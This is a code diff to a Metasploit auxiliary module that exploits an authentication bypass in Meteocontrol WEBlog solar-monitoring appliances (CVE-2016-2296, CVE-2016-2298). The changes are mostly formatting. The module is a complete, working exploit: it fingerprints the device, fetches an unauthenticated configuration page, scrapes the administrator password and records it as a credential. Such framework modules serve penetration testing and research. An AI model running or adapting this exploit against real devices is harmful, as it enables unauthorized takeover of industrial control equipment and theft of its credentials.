@@ -15,25 +15,25 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'        => 'Meteocontrol WEBlog Password Extractor',
       'Description' => %{
-          This module exploits an authentication bypass vulnerability in Meteocontrol WEBLog (all models) to extract Administrator password for the device management portal.
+          This module exploits an authentication bypass vulnerability in Meteocontrol WEBLog appliances (software version < May 2016 release) to extract Administrator password for the device management portal.
       },
       'References'  =>
         [
-             [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-16-133-01' ],
-             [ 'CVE', '2016-2296' ],
-             [ 'CVE', '2016-2298' ]
+          ['URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-16-133-01'],
+          ['CVE', '2016-2296'],
+          ['CVE', '2016-2298']
         ],
       'Author'         =>
         [
-          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
+          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'License'        => MSF_LICENSE
-    ))
+      'License'        => MSF_LICENSE))
 
     register_options(
-    [
-        Opt::RPORT(8080)	# Application may run on a different port too. Change port accordingly.
-    ], self.class)
+      [
+        Opt::RPORT(8080) # Application may run on a different port too. Change port accordingly.
+      ], self.class
+    )
   end
 
   def run_host(ip)
@@ -50,17 +50,17 @@ class MetasploitModule < Msf::Auxiliary
 
   def is_app_metweblog?
     begin
-      res = send_request_cgi(
-      {
-        'uri'       => '/html/en/index.html',
-        'method'    => 'GET'
+      res = send_request_cgi({
+        'uri'     => '/html/en/index.html',
+        'method'  => 'GET'
       })
+
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
       return false
     end
 
-    if (res and res.code == 200 and (res.headers['Server'] and res.headers['Server'].include?("IS2 Web Server") or res.body.include?("WEB'log")))
+    if (res && res.code == 200 && (res.headers['Server'] && res.headers['Server'].include?("IS2 Web Server") || res.body.include?("WEB'log")))
       print_good("#{rhost}:#{rport} - Running Meteocontrol WEBlog management portal...")
       return true
     else
@@ -77,27 +77,27 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("#{rhost}:#{rport} - Attempting to extract Administrator password...")
     begin
-      res = send_request_cgi(
-      {
-        'uri'       => '/html/en/confAccessProt.html',
-        'method'    => 'GET'
+      res = send_request_cgi({
+          'uri'       => '/html/en/confAccessProt.html',
+          'method'    => 'GET'
       })
 
- rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
       return
     end
 
-    if (res and res.code == 200 and res.body.include?("szWebAdminPassword") or res.body=~ /Admin Monitoring/)
+    if (res && res.code == 200 && (res.body.include?("szWebAdminPassword") || res.body=~ /Admin Monitoring/))
       get_admin_password = res.body.match(/name="szWebAdminPassword" value="(.*?)"/)
       admin_password = get_admin_password[1]
       print_good("#{rhost}:#{rport} - Password is #{admin_password}")
       report_cred(
-                ip: rhost,
-                port: rport,
-                service_name: 'Meteocontrol WEBlog Management Portal',
-                password: admin_password,
-                proof: res.body)
+        ip: rhost,
+        port: rport,
+        service_name: 'Meteocontrol WEBlog Management Portal',
+        password: admin_password,
+        proof: res.body
+      )
     else
       # In some models, 'Website password' page is renamed or not present. Therefore, password can not be extracted. Try login manually in such cases.
       print_error("Password not found. Check login manually.")
